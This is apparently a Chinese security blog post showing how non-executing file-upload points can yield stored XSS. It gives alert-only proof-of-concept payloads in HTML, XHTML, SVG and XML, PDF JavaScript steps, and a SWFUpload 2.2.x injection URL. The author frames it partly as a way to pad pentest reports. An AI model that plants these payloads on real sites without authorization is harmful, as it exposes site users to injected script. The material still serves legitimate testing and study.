#  【技术分享】文件上传XSS漏洞的利用方式   
原创 剁椒Muyou鱼头  剁椒Muyou鱼头   2025-01-02 00:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/92Yia6FpSFA2QiaAzq0Dumm39PGIsC7mk4lX6c4yYnERUGvnHo7SQreGiboYBj0ib7TlaUx1DKtEGlU8mqS9ZtLZRw/640?wx_fmt=gif "")  
  
**阅读须知**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/92Yia6FpSFA2QiaAzq0Dumm39PGIsC7mk4lX6c4yYnERUGvnHo7SQreGiboYBj0ib7TlaUx1DKtEGlU8mqS9ZtLZRw/640?wx_fmt=gif "")  
  
  
****  
**本公众号文章皆为网上公开的漏洞，仅供日常学习使用，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。**  
  
朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把**剁椒Muyou鱼头**  
“设为星标”，否则可能就看不到了啦！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2hvEA8gEIeGOEiba9uWicXD01hM2Bw8oTpcNCZl68Bj8T0aLpOHAMFCv9Qd6KeeQgTscOURdQUDbLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/92Yia6FpSFA2QiaAzq0Dumm39PGIsC7mk4Z7hc6oGV6C6IwibzfQUM1oq1yUciadAKQ3Ap29o8GGnBU52wXgSSicBxQ/640?wx_fmt=gif "")  
  
  
****  
**2025/01/02 星期四**  
  
**多云·东****北风3级**  
  
  
//01 无法解析利用的废弃文件上传漏洞  
  
  
    在日常渗透测试中，会发现各种上传功能点，首先会测试利用是否存在文件上传漏洞，上传与网站脚本语言相对应的恶意代码动态脚本（如jsp、asp、php、aspx文件后缀）到服务器上，一旦这些脚本被Web容器解释并执行，就能访问这些脚本中包含的恶意代码，达到执行恶意代码的效果。  
  
    但是，在实际渗透测试中经常会发现一些无法解析的上传点，或者严格限制了上传文件的后缀名的上传点。这种漏洞在攻防演练中或许可以直接放弃，但是在一些特定的工作下，比如就是需要凑点漏洞写写报告，可以尝试上传一些可以解析XSS漏洞的文件，在报告里写一个XSS跨站脚本漏洞。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSQfd46n6IUhEYLwPDlgXDNUCb6grdUWRibmYr7zjmmsU2aZj7z6tqXRA/640?wx_fmt=png&from=appmsg "")  
  
  
//02 可以解析XSS漏洞的文件后缀  
  
<table><tbody><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">序号</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">如何触发</span></span></section></td></tr><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">1</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;color: rgb(0, 0, 0);font-weight: normal;">HTML后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">新建含有xss语句的html文件上传即可</span></span></section></td></tr><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">2</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;font-weight: normal;">XHTML后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">新建含有xss语句的xhtml文件上传即可</span></span></section></td></tr><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">3</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;font-weight: normal;">SVG后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">新建含有xss语句的svg文件上传即可</span></span></section></td></tr><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">4</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;font-weight: normal;">XML后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">新建含有xss语句的xml文件上传即可</span></span></section></td></tr><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">5</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;font-weight: normal;">PDF后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">在JavaScript中插入xss语句保存pdf上传</span></span><span style="font-size: 15px;letter-spacing: 0.034em;background-color: transparent;"><span leaf="">即可</span></span></section></td></tr><tr><td data-colwidth="62" width="62" valign="top"><section style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 15px;">6</span></span></section></td><td data-colwidth="149" width="149" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;font-weight: normal;">SWF后缀文件</span></span></section></td><td data-colwidth="362" width="362" valign="top"><section><span leaf=""><span textstyle="" style="font-size: 15px;">上传swfupload.swf文件构造指定语句触发</span></span></section></td></tr></tbody></table>  
  
//03 文件上传XSS漏洞测试  
  
  
HTML后缀文件  
```
<html>
<head>
<body><p></p></body>
<img src="1" onerror="alert('/xss/')">
</head>
</html>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lS0F5eUSexTIZiagzfymnKBKCmLY3V3udffiaBRgaSuQYHY9eGTCyxtcZA/640?wx_fmt=png&from=appmsg "")  
  
  
XHTML后缀文件  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
</head>
<body>
<img src="1" onerror="alert('/xss/')">
</body>
</html>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSzFbQiaicolcuiaQOOmgEHEqB25boOSlBF2NdO6ibzogppBBckibUudQNZlQ/640?wx_fmt=png&from=appmsg "")  
  
  
SVG后缀文件  
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(/xss/);
</script>
</svg>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSDzqeYurHSHeIsNETjaLqlEL7wZTERMZmGD6wMTQ0Wf4gLSFzw309FA/640?wx_fmt=png&from=appmsg "")  
  
  
XML后缀文件  
```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml"> alert(/xss/);
</something:script>
</body>
</html>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSKPKlUOWquImA2DXnTib3hd7Iv6zFSQ1iaKEndqLzPvFmBiabBs8BGicxxw/640?wx_fmt=png&from=appmsg "")  
  
  
PDF后缀文件  
  
1.启动迅捷 PDF 编辑器打开一个 PDF 文件，或者使用“创建 PDF 文件”功能，通过将其他文档和资源转换为“可移植文档格式”来创建 PDF 文件。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSFuiceoibNrdgn38uqKV2cl8SpomWylBTqeWkguf7z6ICM5V2mn86eaxw/640?wx_fmt=png&from=appmsg "")  
  
  
2.单击左侧的“页面”标签，选择与之对应的页面缩略图，然后从选项下拉菜单中选择“页面属性”命令。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSjJ4P6CZJgCLe94Uiahnb5DoET2PM9YqMdTAxZZBoSKN6cd7wemYM80w/640?wx_fmt=png&from=appmsg "")  
  
  
3.在“页面属性”对话框单击“动作”标签，再从“选择动作”下拉菜单中选择“运行 JavaScript”命令，然后单击【添加】按钮，弹出 JavaScript 编辑器对话框。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSSkhtuMmTk68ibPITmHFontJ9fJ88rVpxlSsib4DTF4pibibQFoSbFz12oA/640?wx_fmt=png&from=appmsg "")  
  
  
4.在弹出的“JavaScript 编辑器”对话框中输入代码：app.alert('XSS');保存关闭，直接打开刚才保存的 PDF 文件，JavaScript 代码即被执行。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lSo80j8KjuPHxQ9TUPtx5JRLm6PuoibVESIib4c1RGg3654cfqdCibe3vPw/640?wx_fmt=png&from=appmsg "")  
  
  
SWF后缀文件  
  
如果可以上传swf文件的话，可以利用SWFUpload 2.2.x版本存在XSS漏洞进行触发。一般很少碰到可以允许上传swf文件的情况。  
  
1.首先上传swfupload.swf文件，下面附上了下载地址。  
```
https://codeload.github.com/ntulip/swfupload-jquery-plugin/zip/refs/heads/master
```  
  
2.将swfupload.swf文件进行上传，然后构造以下POC进行触发XSS漏洞。  
```
swfupload.swf?movieName="%5d%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%28/xss/%29;//
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/92Yia6FpSFA2rayvPneR61SuaHko0u4lS1L2Q6x5qj7Q8qlLnyUSWmI3oqYvTnlSMGicGxYu2FK9sdGicmo3HP9cw/640?wx_fmt=png&from=appmsg "")  
  
  
//04 总结  
  
  
    本文讲述了在无法解析利用的废弃文件上传漏洞的前提下，去触发XSS漏洞，来进行水报告的一种思路方式。但是在实际渗透测试和SRC挖掘时的确碰到过上传HTML文件触发XSS漏洞，被确认为XSS存储漏洞给奖励的，但是大多数的SRC厂商都是不收的，不过项目上水报告很好用。  
  
  
  
    
END   
  
  
   
作者 | 剁椒Muyou鱼头  
   
  
I like you,but just like you.  
  
我喜欢你，仅仅如此，喜欢而已~  
  
  
  
  
**********点赞在看不迷路哦！**  
  
  
